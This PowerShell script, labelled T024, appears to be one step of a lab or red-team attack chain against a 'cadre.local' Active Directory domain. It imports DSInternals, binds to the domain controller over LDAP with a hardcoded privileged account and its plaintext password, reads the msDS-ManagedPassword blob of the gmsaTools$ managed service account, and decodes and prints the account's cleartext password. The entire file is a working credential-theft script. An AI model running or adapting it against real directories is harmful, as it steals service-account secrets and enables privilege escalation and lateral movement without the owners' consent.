# T024 — gMSA password extraction for gmsaTools$ from ws01 (chief_command DA context)
# Uses DSInternals to decode msDS-ManagedPassword blob via raw LDAP.
$ErrorActionPreference = 'Stop'

$dsi = 'C:\Tools\cadre-attack\DSInternals_v4.7'
if (-not (Test-Path "$dsi\DSInternals.psd1")) {
  $mods = Get-ChildItem 'C:\Tools\cadre-attack' -Recurse -Filter 'DSInternals.psd1' -ErrorAction SilentlyContinue | Select-Object -First 1
  if ($mods) { $dsi = $mods.DirectoryName } else { throw "DSInternals module not found" }
}
Import-Module "$dsi\DSInternals.psd1" -Force -ErrorAction Stop
Write-Output "DSINTERNALS loaded"

$user = 'cadre.local\chief_command'
$pass = ConvertTo-SecureString 'C0mm@nd_Ch1ef!' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential($user, $pass)

Write-Output "=== T024 gMSA extraction: gmsaTools$ ==="
# Read msDS-ManagedPassword via LDAP (requires ReadGMSAPassword or DA)
$net = $cred.GetNetworkCredential()
$entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://dc01.cadre.local/CN=gmsaTools,CN=Managed Service Accounts,DC=cadre,DC=local", $net.UserName, $net.Password)
$entry.RefreshCache()
$blob = $entry.Properties['msDS-ManagedPassword'].Value
if (-not $blob) {
  Write-Output "GMSA_BLOB_MISSING"
  # Try to check ACL visibility
  $entry2 = New-Object System.DirectoryServices.DirectoryEntry("LDAP://dc01.cadre.local/CN=gmsaTools,CN=Managed Service Accounts,DC=cadre,DC=local", $net.UserName, $net.Password)
  $entry2.RefreshCache()
  Write-Output "GMSA_DN $($entry2.distinguishedName)"
  exit 1
}
Write-Output "GMSA_BLOB_LEN $($blob.Length)"
$decoded = ConvertFrom-ManagedPasswordBlob -Blob $blob -ErrorAction SilentlyContinue
if ($decoded) {
  Write-Output "GMSA_PW $($decoded.SecureCurrentPassword | ForEach-Object { $ptr=[Runtime.InteropServices.Marshal]::SecureStringToBSTR($_); [Runtime.InteropServices.Marshal]::PtrToStringBSTR($ptr) })"
} else {
  Write-Output "GMSA_DECODE_FAILED"
}
Write-Output "T024_DONE"
